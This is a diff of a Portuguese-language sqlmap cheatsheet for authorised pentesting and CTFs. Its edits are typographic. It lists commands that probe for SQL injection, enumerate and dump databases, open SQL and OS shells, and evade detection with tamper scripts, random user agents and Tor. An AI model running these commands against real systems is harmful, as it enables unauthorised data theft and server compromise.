@@ -1,23 +1,23 @@
 ---
-title: sqlmap cheatsheet
-description: As flags do sqlmap que eu uso de verdade, do primeiro probe até a shell.
+title: sqlmap _cheatsheet_
+description: As _flags_ do sqlmap que eu uso de verdade, do primeiro _probe_ até a _shell_.
 date: 2026-11-14
 tags: [sqli, web, sqlmap, cheatsheet]
 attack: [T1190, T1505.003]
 status: finished
 ---
 
-> Só em labs próprios, CTFs ou com autorização por escrito.
+> Só em _labs_ próprios, CTFs ou com autorização por escrito.
 
-## Comece por um request
+## Comece por um _request_
 
-Um request salvo do Burp leva cookies, headers e o corpo do POST. É o jeito mais confiável de começar.
+Um _request_ salvo do Burp leva cookies, _headers_ e o corpo do POST. É o jeito mais confiável de começar.
 
 ```bash
 sqlmap -r req.txt -p id --batch
 ```
 
-Direto de uma URL. Atenção ao `?`, sem ele o sqlmap não enxerga parâmetro:
+Direto de uma URL. Atenção ao `?`: sem ele, o sqlmap não enxerga o parâmetro:
 
 ```bash
 sqlmap -u "http://target/page.php?param1=value1&param2=value2" -p param2 --dbs
@@ -59,7 +59,7 @@ sqlmap -r req.txt -D "$DATABASE" --tables
 sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --columns
 ```
 
-## Dump
+## _Dump_
 
 ```bash
 sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump
@@ -69,7 +69,7 @@ sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --count
 sqlmap -r req.txt -D "$DATABASE" -T "$TABLE" --dump --start=1 --stop=3
 ```
 
-## Shells
+## _Shells_
 
 ```bash
 sqlmap -r req.txt --sql-shell
@@ -77,7 +77,7 @@ sqlmap -r req.txt -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
 sqlmap -r req.txt --os-shell
 ```
 
-O `--os-shell` no MySQL precisa do privilégio `FILE`, de uma pasta gravável no webroot e do caminho dela. Confira `--is-dba` e `--privileges` antes.
+O `--os-shell` no MySQL precisa do privilégio `FILE`, de uma pasta gravável no _webroot_ e do caminho dela. Confira `--is-dba` e `--privileges` antes.
 
 ## Evasão e roteamento
 
@@ -92,7 +92,7 @@ sqlmap -r req.txt --tamper=space2comment,between --random-agent
 sqlmap -r req.txt --tor --tor-type=SOCKS5 --check-tor
 ```
 
-## Housekeeping
+## _Housekeeping_
 
 ```bash
 # o sqlmap guarda resultados por alvo, comece do zero
@@ -101,6 +101,6 @@ sqlmap -r req.txt --flush-session
 
 ## Notas
 
-- O User-Agent padrão diz `sqlmap`. Use `--random-agent` ou defina o seu.
-- Em engagement, o tráfego deve sair dos IPs de origem combinados. Tor quebra isso.
-- O `req.txt` guarda tokens de sessão. Mantenha fora do git e apague ao terminar.
+- O User-Agent padrão contém `sqlmap`. Use `--random-agent` ou defina o seu.
+- Em _engagement_, o tráfego deve sair dos IPs de origem combinados. Tor quebra isso.
+- O `req.txt` guarda _tokens_ de sessão. Mantenha-o fora do git e apague-o ao terminar.
